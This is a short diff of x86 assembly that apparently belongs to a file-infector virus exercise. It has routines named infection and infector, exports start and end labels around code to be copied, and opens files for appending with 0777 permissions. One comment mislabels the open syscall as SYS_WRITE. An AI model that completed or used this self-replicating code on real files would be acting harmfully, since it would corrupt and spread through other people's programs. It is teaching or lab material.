@@ -3,6 +3,8 @@ global _start
 global system_call
 global infection
 global infector
+global code_start
+global code_end
 extern main
 
 _start:
@@ -43,18 +45,6 @@ system_call:
     ret                     ; Back to caller
 
 code_start:
-    push    ebp 
-    mov     ebp, esp 
-
-    call infection
-
-    push dword [ebp+8]
-    call infector
-    sub esp, 4
-
-    pop ebp
-    ret
-
 infection:
     push    ebp 
     mov     ebp, esp 
@@ -82,7 +72,7 @@ open_file:
     mov     eax, 5          ; SYS_WRITE
     mov     ebx, [ebp+8]    ; filename
     mov     ecx, 2 | 1024      
-    mov     edx, 0
+    mov     edx, 511
     int 0x80
     mov [ebp-4], eax  
 
